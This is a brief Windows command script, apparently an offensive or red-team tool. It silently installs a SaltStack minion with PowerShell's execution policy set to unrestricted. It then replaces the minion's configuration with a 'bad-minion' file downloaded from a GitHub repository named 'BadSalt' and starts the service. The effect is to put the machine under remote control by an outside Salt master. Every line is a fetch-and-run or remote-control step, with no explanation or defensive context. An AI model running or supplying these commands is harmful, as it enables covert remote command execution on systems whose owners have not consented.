powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://repo.saltstack.com/windows/Salt-Minion-2018.3.3-Py2-AMD64-Setup.exe', 'C:\Windows\Temp\saltstack.exe')
C:\Windows\Temp\saltstack.exe /S /master=salt
del C:\Windows\Temp\saltstack.exe
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion-windows.conf', 'C:\salt\conf\minion')
sc start salt-minion

